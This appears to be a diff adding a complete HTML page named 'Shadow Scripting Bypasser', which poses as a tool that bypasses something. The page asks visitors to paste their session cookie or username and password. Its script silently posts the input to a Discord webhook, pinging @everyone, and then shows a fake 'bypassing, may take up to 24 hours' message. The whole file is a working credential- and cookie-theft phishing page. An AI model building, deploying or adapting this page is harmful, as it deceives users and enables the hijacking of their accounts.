@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Shadow Scripting Bypasser</title>
+  <style>
+    body {
+      background: #0d0d0d;
+      color: #eee;
+      font-family: 'Segoe UI', sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    h1 {
+      color: #9b59b6;
+      text-shadow: 0 0 10px #9b59b6;
+    }
+
+    input, button {
+      padding: 10px;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      margin-top: 20px;
+    }
+
+    input {
+      width: 300px;
+      background: #222;
+      color: #fff;
+    }
+
+    button {
+      background: #9b59b6;
+      color: white;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    button:hover {
+      background: #8e44ad;
+    }
+
+    #status {
+      margin-top: 20px;
+      color: #888;
+      font-style: italic;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>Shadow Scripting Bypasser</h1>
+  <input type="text" id="userInput" placeholder="Enter your cookie or username and password...">
+  <button onclick="sendToWebhook()">Bypass</button>
+  <div id="status"></div>
+
+  <script>
+    function sendToWebhook() {
+      const input = document.getElementById('userInput').value;
+      const status = document.getElementById('status');
+
+      if (!input) {
+        status.textContent = "Please enter something.";
+        return;
+      }
+
+      const webhookURL = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
+
+      const payload = {
+        content: "@everyone\n**New Bypass** 🔥",
+        embeds: [
+          {
+            title: "Bypass Input",
+            description: "```" + input + "```",
+            color: 0x9b59b6,
+            footer: {
+              text: "Shadow Scripting Bypasser"
+            },
+            timestamp: new Date().toISOString()
+          }
+        ]
+      };
+
+      fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+      });
+
+      status.textContent = "Bypassing in process... it may take up to 24 hours.";
+      document.getElementById('userInput').value = '';
+    }
+  </script>
+
+</body>
+</html>
